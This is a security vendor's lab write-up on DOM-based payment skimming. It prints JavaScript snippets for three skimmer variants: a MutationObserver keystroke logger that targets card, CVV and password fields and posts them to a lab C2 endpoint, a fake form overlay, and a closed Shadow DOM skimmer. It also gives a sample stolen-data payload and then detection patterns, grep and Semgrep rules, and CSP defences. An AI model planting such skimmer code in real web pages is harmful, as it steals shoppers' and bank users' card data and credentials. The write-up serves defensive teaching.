---
title: "DOM-Based Skimming: Real-Time Payment Interception Without Form Submission"
slug: "dom-based-skimming"
date: 2026-02-20
description: "A deep-dive into Lab 2 — how DOM-based skimming attacks intercept payment data in real-time using MutationObserver, form overlays, and Shadow DOM, before the user even hits submit."
categories: ["threat-intel"]
tags: ["dom-skimming", "e-skimming", "javascript", "payment-security", "lab-writeup", "mutation-observer", "shadow-dom", "banking-trojan"]
author: "PCI Oasis"
canonicalURL: "https://blog.pcioasis.com/posts/threat-intel/dom-based-skimming/"
ShowToc: true
TocOpen: true
---

> **Educational Purpose Only.** This article and Lab 2 are strictly for educational purposes. Code examples demonstrate attack techniques to help security professionals understand and defend against them. Never use these techniques on systems you don't own.

## Beyond the Submit Button

Classic Magecart attacks ([covered in Lab 1](/posts/threat-intel/understanding-magecart/)) wait for a user to hit "Submit" before stealing payment data. DOM-based skimming is more aggressive: it captures data **keystroke by keystroke**, in real time, before any form is submitted.

The attacker does not need to intercept a form submission event. By the time the victim clicks "Pay," their card number, CVV, and billing details are already sitting on a remote C2 server.

Lab 2 demonstrates three progressively sophisticated variants of this attack, all targeting a simulated online banking portal (SecureBank):

| Variant | Technique | Stealth Level |
|---|---|---|
| DOM Monitor | MutationObserver + event listeners | Medium |
| Form Overlay | Dynamic fake form injection | High |
| Shadow DOM Skimmer | Closed Shadow DOM isolation | Very High |

## Real-World DOM-Based Attacks

DOM-based skimming has been observed in the wild across multiple threat actor groups:

| Attack | Group | Technique | Impact |
|---|---|---|---|
| Inter Skimmer (2019) | Magecart Group 12 | Real-time keystroke capture via DOM events | 1,500+ compromised stores |
| Pipka Skimmer (2019) | Unknown | Self-removing script post-execution | Targeted Shopify sites |
| ImageID Skimmer (2020) | Multiple groups | DOM mutation with obfuscated payloads | Eastern European targeting |
| Cockpit Skimmer (2021) | Magecart Group 8 | jQuery prototype pollution + DOM hooks | SaaS checkout platforms |

These attacks are harder to detect than classic Magecart because they:
- Leave no trace in form submission network requests
- Exfiltrate data continuously rather than in one POST
- Survive page navigation in single-page applications (SPAs)
- Use legitimate browser APIs in ways that are difficult to distinguish from normal behavior

## The Target: SecureBank

Lab 2's target is a simulated online banking portal with four forms containing high-value data:

```
SecureBank Dashboard
├── Add Card Form          → Card number, cardholder name, expiry, CVV, billing zip
├── Transfer Form          → From/to accounts, amount, memo
├── Bill Pay Form          → Payee, account number, amount, date
└── Card Actions Modal     → CVV verification
```

Unlike a one-page checkout, a banking portal presents a richer attack surface — multiple forms across tabs, dynamically loaded modals, and persistent sessions that make real-time exfiltration highly effective.

{{< figure src="securebank-dashboard.png" alt="SecureBank dashboard showing the Cards tab with the Add Card form" caption="SecureBank — Lab 2's target banking portal. The Cards tab exposes card number, expiry, CVV, and billing zip in a single form." >}}

## Variant 1: DOM Monitor (Real-Time Field Capture)

### How It Works

The DOM Monitor attack uses three browser APIs in combination:

1. **`MutationObserver`** — watches the entire DOM for new forms and input fields as they appear
2. **Event listeners** — attaches `keydown`, `keyup`, `input`, `focus`, `blur`, and `paste` handlers to every targeted field
3. **`setInterval`** — exfiltrates captured data to the C2 server every 5 seconds

The attack initializes with a targeted field selector list covering 16+ field types:

```javascript
const CONFIG = {
  exfilUrl: window.location.origin + '/lab2/c2/collect',
  targetFields: [
    // Password fields
    'input[type="password"]',
    'input[autocomplete*="password"]',
    // Credit card fields
    'input[autocomplete*="cc-number"]',
    'input[autocomplete*="cc-exp"]',
    'input[autocomplete*="cc-csc"]',
    'input[name*="card"]',
    'input[id*="card"]',
    'input[name*="cvv"]',
    'input[id*="cvv"]',
    // Banking fields
    'input[name*="account"]',
    'input[name*="routing"]',
    // PII
    'input[type="email"]',
    'input[type="tel"]'
  ],
  keystrokeInterval: 50,    // Capture every 50ms
  reportInterval: 5000      // Exfiltrate every 5 seconds
}
```

### The MutationObserver Setup

This is the core of what makes DOM-based attacks persist across dynamic UI changes — tab switches, modal popups, and SPA navigation:

```javascript
function initMutationObserver() {
  mutationObserver = new MutationObserver(mutations => {
    mutations.forEach(mutation => {
      if (mutation.type === 'childList') {
        mutation.addedNodes.forEach(node => {
          if (node.nodeType === Node.ELEMENT_NODE) {
            const newFields = findFieldsInNode(node)
            if (newFields.length > 0) {
              attachFieldMonitors(newFields)  // Hook new fields immediately
            }
          }
        })
      }
      // Also re-evaluate when field attributes change
      if (mutation.type === 'attributes' && mutation.target.tagName === 'INPUT') {
        const newFields = findFieldsInNode(mutation.target)
        if (newFields.length > 0) attachFieldMonitors(newFields)
      }
    })
  })

  mutationObserver.observe(document, {
    childList: true,
    subtree: true,
    attributes: true,
    attributeFilter: ['type', 'name', 'id', 'class', 'autocomplete']
  })
}
```

> **Why `subtree: true`?** Without it, the observer only watches direct children of `document`. Setting `subtree: true` watches the entire DOM tree — ensuring newly rendered modals, dynamically injected checkout widgets, and lazy-loaded payment iframes all get picked up automatically.

### Per-Field Event Monitoring

Once a field is discovered, the attacker attaches a full event listener suite:

```javascript
function attachFieldMonitors(fields) {
  fields.forEach(field => {
    const element = field.element
    attachedElements.add(element)  // WeakSet prevents duplicate attachment

    const fieldSession = {
      fieldId: generateFieldId(element),
      fieldType: field.type,
      fieldName: field.name,
      keystrokes: [],
      values: []
    }

    // Capture every keystroke
    element.addEventListener('keydown', e => captureKeystroke(fieldSession, e, 'keydown'))
    element.addEventListener('keyup',   e => captureKeystroke(fieldSession, e, 'keyup'))

    // Capture value changes (including autofill and paste)
    element.addEventListener('input',  e => captureValueChange(fieldSession, e.target.value, 'input'))
    element.addEventListener('change', e => captureValueChange(fieldSession, e.target.value, 'change'))

    // Paste detection (value not updated until next tick)
    element.addEventListener('paste', e => {
      setTimeout(() => captureValueChange(fieldSession, e.target.value, 'paste'), 10)
    })

    // High-value fields trigger immediate exfiltration on blur
    element.addEventListener('blur', e => {
      captureFieldEvent(fieldSession, 'blur', e.target.value)
      if (isHighValueField(element)) {
        scheduleImmediateExfiltration(fieldSession)
      }
    })

    capturedData.sessions.push(fieldSession)
  })
}
```

The `isHighValueField()` function identifies fields that warrant **immediate** exfiltration rather than waiting for the 5-second interval:

```javascript
function isHighValueField(element) {
  const highValuePatterns = [
    /password/i, /cvv/i, /cvc/i, /cc-csc/i,
    /card.*number/i, /account.*number/i, /routing/i
  ]
  const elementText = (element.name + ' ' + element.id + ' ' + element.autocomplete).toLowerCase()
  return highValuePatterns.some(pattern => pattern.test(elementText))
}
```

{{< figure src="devtools-network-collect.png" alt="DevTools Network tab showing POST requests to /lab2/c2/collect every 5 seconds" caption="DevTools Network tab filtered to '/collect' — POST requests arrive every 5 seconds while typing. Each payload contains the partial card number captured so far." >}}

### What the C2 Server Receives

Every 5 seconds (or immediately for high-value fields), the skimmer sends a payload like this:

```json
{
  "type": "periodic",
  "timestamp": 1704067800000,
  "metadata": {
    "url": "https://securebank.example.com/cards",
    "userAgent": "Mozilla/5.0 ...",
    "attackType": "dom-monitor-realtime"
  },
  "summary": {
    "keystrokesCount": 47,
    "fieldsCount": 4
  },
  "fullData": {
    "keystrokes": [
      { "field": "card-number", "value": "4",  "timestamp": 1704067795100 },
      { "field": "card-number", "value": "45", "timestamp": 1704067795200 }
    ],
    "fieldValues": {
      "card-number": "4532-1234-5678-9010",
      "cvv": "123",
      "expiry": "12/25",
      "cardholder-name": "Jane Smith"
    }
  }
}
```

Note that the attacker receives the card number being **typed character by character**. Even if the user notices something is wrong and clears the field, the data is already exfiltrated.

{{< figure src="c2-dashboard-keystrokes.png" alt="C2 dashboard showing captured keystrokes with card number reconstructed character by character" caption="The Lab 2 C2 dashboard showing real-time keystroke capture. The card number is reconstructed incrementally — deletion or correction does not help." >}}

## Variant 2: Form Overlay (Dynamic Fake Form Injection)

Where the DOM Monitor is passive (it only observes), the Form Overlay attack is active: it **replaces** the legitimate payment form with a visually identical fake.

### The Injection Technique

The overlay is injected with a high `z-index` so it appears to be the real form:

```javascript
function createOverlayForm() {
  const overlay = document.createElement('div')
  overlay.style.cssText = `
    position: fixed;
    top: 0; left: 0;
    width: 100%; height: 100%;
    z-index: 999999;
    background: rgba(255,255,255,0.98);
  `
  // Clone the bank's own CSS classes from the real form
  const realForm = document.querySelector('#add-card-form')
  overlay.innerHTML = buildFakeFormHTML(realForm)

  // Real form is hidden, not removed — bank's JS still functions
  realForm.style.display = 'none'
  document.body.appendChild(overlay)
}
```

The real form is hidden (not removed) so the bank's own JavaScript — form validation, session management, API calls — continues to work. When the victim submits the fake form, the overlay captures the data, removes itself, and programmatically triggers submission on the real hidden form. The legitimate transaction completes normally.

### Why This Is Hard to Detect

From a victim's perspective: the page looks identical, the transaction succeeds, no error occurs. From a DevTools perspective: the form the victim sees is a dynamically created DOM element with no source file. It will not appear in the Sources panel.

{{< figure src="form-overlay-active.png" alt="SecureBank Add Card form with overlay active — visually identical to the real form" caption="The overlay form is pixel-identical to the real form but lives entirely in attacker-controlled DOM. The browser's Sources panel shows no source file for it." >}}

## Variant 3: Shadow DOM Skimmer (Maximum Stealth)

The Shadow DOM Skimmer is the most advanced variant. It uses the browser's Shadow DOM API to hide its attack infrastructure in a **closed shadow tree** — genuinely invisible to `document.querySelector`, browser extensions, and most security scanners.

### Shadow DOM Basics

A shadow root attached with `{ mode: 'closed' }` cannot be accessed from outside:

```javascript
const host = document.createElement('div')
host.style.cssText = 'position:absolute;width:0;height:0;overflow:hidden;'
document.body.appendChild(host)

// Closed shadow root — no external JS can call host.shadowRoot
const shadowRoot = host.attachShadow({ mode: 'closed' })
// The attacker retains a private reference; all other scripts are locked out
```

### What Lives in the Shadow

The attacker's monitoring infrastructure — event listeners, data buffers, exfiltration functions — all live inside the shadow tree. From the main document, there is nothing to find:

```javascript
const CONFIG = {
  shadowMode: 'closed',          // Not accessible via host.shadowRoot
  hiddenElements: true,          // Host element is zero-size and off-screen
  crossBoundaryMonitoring: true, // Monitor events that bubble across shadow boundaries
  nestedDepth: 5                 // Up to 5 levels of nested shadows for extra isolation
}
```

### Cross-Boundary Event Monitoring

Events dispatched on elements inside a shadow tree do bubble out, but their `target` is retargeted to the shadow host. The attacker hooks into the host's event listeners and uses `composedPath()` to find the real target:

```javascript
// Events from inside the shadow bubble out as if from the host element
shadowHost.addEventListener('input', capturedEvent => {
  // composedPath() reveals the real target despite retargeting
  const realTarget = capturedEvent.composedPath()[0]
  captureFieldValue(realTarget)
}, true)  // useCapture: true to intercept before other listeners
```

> **Why `composedPath()`?** Event retargeting hides the real origin of shadow DOM events from external observers. `composedPath()` is one of the few APIs that can pierce the shadow boundary — attackers use it deliberately.

### Anti-Analysis: Hooking `attachShadow`

The Shadow DOM Skimmer overrides the native `attachShadow` to monitor every shadow root created on the page — including those from legitimate web components:

```javascript
const originalAttachShadow = Element.prototype.attachShadow
Element.prototype.attachShadow = function(init) {
  const shadowRoot = originalAttachShadow.call(this, init)
  monitorShadowRoot(shadowRoot)
  return shadowRoot
}
```

{{< figure src="devtools-elements-shadow-root.png" alt="DevTools Elements panel showing zero-sized host div with #shadow-root (closed) label" caption="DevTools Elements panel — the attack infrastructure appears as a zero-sized div with a '#shadow-root (closed)' label. The shadow tree cannot be expanded or inspected." >}}

## Lab 2 Technical Walkthrough

### File Structure

```
02-dom-skimming/
├── vulnerable-site/
│   ├── banking.html                    # SecureBank target (base href="/lab2/")
│   ├── js/banking.js                   # Legitimate banking application (26.8 KB)
│   ├── css/banking.css
│   └── malicious-code/
│       ├── dom-monitor.js              # Variant 1: Real-time field monitoring (18.9 KB)
│       ├── form-overlay.js             # Variant 2: Dynamic form injection (26.6 KB)
│       └── shadow-skimmer.js           # Variant 3: Shadow DOM stealth (24.7 KB)
├── c2-server/
│   ├── server.js                       # Express.js C2 (port 3000/8080)
│   ├── dashboard.html                  # Real-time stolen data viewer
│   └── stolen-data/                    # Captured payloads (timestamped JSON)
└── test/
    └── tests/
        ├── dom-monitor.spec.js         # 5/6 tests pass (83%)
        ├── form-overlay.spec.js        # 7/7 tests pass (100%)
        └── shadow-skimmer.spec.js      # 2/3 tests pass (67%)
```

### Running the Lab

```bash
cd labs/02-dom-skimming

# Start the banking site and C2 server
docker-compose up

# Run in headed mode to observe the attack in a real browser
npm run demo
```

The `demo` command starts the SecureBank site (nginx, port 8080), the C2 server (Express.js, port 3000), and Playwright tests in headed mode so you can watch the attack run in a visible browser window.

### Observing the Attack in DevTools

**Network tab** — filter by `/collect`. POST requests appear every 5 seconds while typing. Each payload contains the partial card number captured so far.

**Sources tab** — locate `dom-monitor.js` and search for `exfilUrl`. Search `attachShadow` to find the shadow-skimmer initialization.

**Elements tab** — for the Shadow DOM variant, look for zero-sized `<div>` elements appended to `<body>`. They show `#shadow-root (closed)` but cannot be expanded.

**Console tab** — `[DOM-Monitor]`, `[Shadow-Skimmer]`, and `[FormOverlay]` prefixed messages reveal attack state. Production attacks disable this logging.

{{< figure src="devtools-sources-dom-monitor.png" alt="DevTools Sources tab showing dom-monitor.js with the exfilUrl CONFIG field highlighted" caption="DevTools Sources panel — dom-monitor.js loaded on the banking page. The CONFIG object's exfilUrl points to the attacker's C2 collection endpoint." >}}

## Key Detection Signatures

### 1. MutationObserver Targeting Payment Fields

```javascript
// High-risk pattern: full document observation with attribute watching
new MutationObserver(callback).observe(document, {
  childList: true,
  subtree: true,
  attributes: true,
  attributeFilter: ['type', 'name', 'autocomplete']
})
```

Legitimate use of MutationObserver rarely needs `subtree: true` on `document` itself and almost never watches `autocomplete` attribute changes.

### 2. Aggregated Event Listeners on Input Fields

```javascript
// Multiple event types on the same field = keystroke logger
element.addEventListener('keydown', captureKeystroke)
element.addEventListener('keyup',   captureKeystroke)
element.addEventListener('input',   captureValue)
element.addEventListener('paste',   capturePaste)
```

Legitimate validation usually needs only `input` or `change`. `keydown + keyup + input + paste` together is a strong keystroke-logging signal.

### 3. Closed Shadow DOM with Zero-Sized Host

```javascript
const host = document.createElement('div')
host.style.cssText = 'position:absolute;width:0;height:0;overflow:hidden;'
document.body.appendChild(host)
const root = host.attachShadow({ mode: 'closed' })
```

### 4. Periodic POST Requests to Non-Payment Domains

Any `setInterval` that triggers a `fetch` POST to a non-payment-processor domain during a banking or checkout session is a critical indicator.

## Detection Methods

### Browser DevTools

1. **Network tab** → XHR/Fetch filter → POST requests to unexpected domains
2. **Sources tab** → search scripts for: `MutationObserver`, `attachShadow`, `composedPath`, `setInterval.*fetch`
3. **Memory tab** → heap snapshot → look for detached DOM trees with attached event listeners

### Static Analysis

```bash
# MutationObserver on the full document
grep -r "observe(document" --include="*.js" .

# Shadow DOM with closed mode
grep -r "attachShadow.*closed" --include="*.js" .

# Keystroke logging combination
grep -rA3 "addEventListener.*keydown" --include="*.js" . | grep "addEventListener.*keyup"

# Periodic exfiltration
grep -r "setInterval.*fetch\|setInterval.*beacon" --include="*.js" .

# composedPath abuse
grep -r "composedPath" --include="*.js" .
```

### Semgrep Rules

```yaml
rules:
  - id: dom-skimmer-mutation-observer
    patterns:
      - pattern: |
          new MutationObserver($CB).observe($TARGET, { subtree: true, ... })
    message: "MutationObserver with full subtree watching — potential DOM skimmer"
    severity: WARNING
    languages: [javascript]

  - id: keystroke-logger-pattern
    patterns:
      - pattern: $EL.addEventListener("keydown", ...)
      - pattern: $EL.addEventListener("keyup", ...)
    message: "keydown + keyup event listeners on same element — potential keystroke logger"
    severity: WARNING
    languages: [javascript]
```

## Prevention Strategies

### Content Security Policy: `connect-src` Is the Critical Directive

For DOM-based attacks, `script-src` is necessary but not sufficient — the malicious code is already loaded. What blocks exfiltration is `connect-src`:

```http
Content-Security-Policy:
  script-src 'self' 'nonce-{RANDOM}' https://trusted-cdn.com;
  connect-src 'self' https://api.your-payment-processor.com;
  form-action 'self';
  report-uri /csp-violation-report;
```

Any `fetch` or `beacon` to a non-allowlisted domain will be blocked. This stops all three Lab 2 variants from successfully exfiltrating data — even if the skimmer code runs.

### Payment Iframes

Isolating payment forms inside cross-origin iframes means injected JavaScript on the parent page cannot access the iframe's DOM. The skimmer cannot attach event listeners to fields it cannot reach.

```html
<!-- Stripe, Braintree, Adyen all use this isolation pattern -->
<iframe src="https://payment-processor.com/checkout-frame"
        sandbox="allow-forms allow-scripts"
        allow="payment">
</iframe>
```

### Additional Defenses

- **Trusted Types API** — prevent DOM injection that could load skimmer scripts
- **Runtime Application Self-Protection (RASP)** — monitor `MutationObserver` and `attachShadow` calls at runtime
- **CSP violation reporting** — deploy `report-only` mode first to understand baseline, then enforce
- **HTTP Observatory** — regularly test your CSP headers at [observatory.mozilla.org](https://observatory.mozilla.org)

## Key Takeaways

- DOM-based skimming captures data character-by-character, before form submission
- `MutationObserver` allows skimmers to persist across dynamic UI changes and SPA navigation
- Closed Shadow DOM creates genuinely invisible attack infrastructure
- `connect-src` CSP is the most effective single control — it blocks exfiltration even if skimmer code runs
- Cross-origin payment iframes eliminate the DOM attack surface entirely

## Try It Yourself

[Lab 2](https://labs.pcioasis.com/lab2) lets you:

- Switch between all three attack variants using the `LAB2_VARIANT` environment variable
- Watch live keystroke capture in the C2 dashboard as you type into SecureBank forms
- Run Playwright tests in headed mode to see the attacks automated
- Practice detection using DevTools and the static analysis patterns above

**Continue learning:**
- [Lab 1: Basic Magecart](/posts/threat-intel/understanding-magecart/) — classic form-submit skimming
- [Lab 3: Browser Extension Hijacking](/posts/threat-intel/supply-chain-attacks-extension-hijacking/) — supply chain attacks via extension compromise
- [MITRE ATT&CK Matrix](https://labs.pcioasis.com/mitre-attack) — T1185 Browser Session Hijacking, T1056.004 Credential API Hooking
- [Interactive Threat Model](https://labs.pcioasis.com/threat-model) — visualize the full attack surface

---

*We're participating in [Google Summer of Code](https://github.com/pci-tamper-protect/e-skimming-labs/blob/stg/docs/GOOGLE_SUMMER_OF_CODE_IDEAS.md). Help us build new detection tooling, lab scenarios, or ML-based skimmer classifiers.*
